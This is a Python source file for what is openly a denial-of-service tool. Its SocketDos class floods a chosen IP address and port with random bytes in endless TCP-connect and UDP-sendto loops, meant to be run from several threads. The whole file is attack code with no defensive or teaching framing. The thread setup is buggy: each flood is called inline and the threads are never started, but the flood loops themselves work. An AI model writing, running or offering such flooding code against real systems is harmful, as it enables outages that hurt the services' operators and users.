import socket
import random
from threading import Thread
from src.utils import color_text
from src.dos.constants import TCP, UDP


class SocketDos():

    def __init__(self, target_ip, target_port, protocol, tcp_size_bytes=1024, udp_size_bytes=1024, thread_number=4):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.tcp_size_bytes = tcp_size_bytes
        self.udp_size_bytes = udp_size_bytes
        self.thread_number = thread_number

    def tcp_flood(self):
        try:
            while True:
                sock = socket.socket(socket.AF_INET, TCP)
                sock.connect((self.target_ip, self.target_port))
                bytes_to_send = random._urandom(self.tcp_size_bytes)
                sock.sendall(bytes_to_send)
        except Exception as e:
            color_text('red', f'[!] Error in tcp_flood: {e}')

    def udp_flood(self):
        """ 
        UDP flood, send 1024 bytes
        """
        sock = socket.socket(socket.AF_INET, UDP)
        bytes_to_send = random._urandom(self.udp_size_bytes)  # random bytes
        while True:
            sock.sendto(bytes_to_send, (self.target_ip, self.target_port))

    def start_attack(self):
        """
        Manage threads and choose attack method
        """
        threads = []
        try:
            for _ in range(self.thread_number):
                if self.protocol != False:
                    if self.protocol == UDP:
                        thread = Thread(target=self.udp_flood())
                    if self.protocol == TCP:
                        thread = Thread(target=self.tcp_flood())
                else:
                    print('Bad method')
                    return

        except Exception as e:
            color_text('red', f'[!] Error: {e}')
